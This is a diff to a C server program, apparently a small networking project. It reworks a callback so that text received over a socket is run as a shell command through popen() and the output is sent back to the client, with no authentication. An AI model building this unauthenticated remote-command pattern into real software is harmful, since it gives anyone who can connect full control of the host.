@@ -66,16 +66,17 @@ struct config * create_shared_memory() {
 
 int server_blues_callback(void *args) {
     int read_size;
-    char client_message[MESSAGE_SIZE];
+    char message[MESSAGE_SIZE];
 
-    dup2(client_connection, 1);
-    dup2(client_connection, 2);
+    dup2(client_connection, 0);
 
-    while (1) {
-        if ((read_size = recv(client_connection, client_message, MESSAGE_SIZE, 0)) > 0) {
-            client_message[read_size] = '\0';
-            system(client_message);
-        }
+    while (recv(client_connection, message, 0, MSG_PEEK | MSG_DONTWAIT) != 0) {
+        FILE *buffer_file;
+        read_size = strlen(fgets(message, MESSAGE_SIZE, stdin));
+        message[read_size] = '\0';
+        buffer_file = popen(message, "r");
+        read_size = fread(message, sizeof(char), MESSAGE_SIZE, buffer_file);
+        send(client_connection, message, read_size, 0);
     }
 
     return 0;
@@ -201,7 +202,7 @@ int captains_callback(void *args) {
         ANSI_COLOR_YELLOW, config->servers[elected_server].port_number, ANSI_COLOR_RESET,
         config->servers[elected_server].connection_count);
 
-     return -1;
+    exit(0);
 }
 
 int server(struct config *config) {
